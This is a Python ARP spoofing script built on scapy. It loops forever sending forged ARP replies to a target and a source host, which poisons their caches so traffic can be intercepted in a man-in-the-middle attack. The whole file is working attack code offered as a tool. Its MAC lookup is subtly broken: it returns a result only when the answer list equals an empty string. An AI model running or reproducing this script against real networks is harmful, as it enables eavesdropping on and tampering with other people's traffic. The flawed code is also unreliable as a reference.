import scapy.all as scapy
import argparse as args
import time

def get_args():
    parser = args.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        dest="target",
        help="Target IP Address and MAC Address"
    )
    parser.add_argument(
        "-s",
        "--source",
        dest="source",
        help="Target IP Address and MAC Address"
    )

    options = parser.parse_args()

    if not options.target and not options.source:
        parser.error(
            "[-] Please specify an target and source, use --help or -h for more info."
        )
    elif not options.target:
        parser.error("[-] Please specify an Target")
    elif not options.source:
        parser.error("[-] Please specify an Source")
    
    return options 
# end def

# start def
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list =="":
        return answered_list[0][1].hwsrc
# end def
# start def
def spoof(ip_target, ip_spoof): 
    target_mac = get_mac(ip_target)
    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=ip_spoof)
    
    scapy.send(packet, verbose=False) 
    
    return
# end def
# start def
def main():
    opt = get_args()
    send_packet = 0
    while True:
        spoof(opt.target, opt.source)
        spoof(opt.source, opt.target)
        send_packet+=2
        print("\r[+] Packets Send:",send_packet, end=" ")
        time.sleep(1)
        
    return
if __name__=='__main__':
    main()
# end def
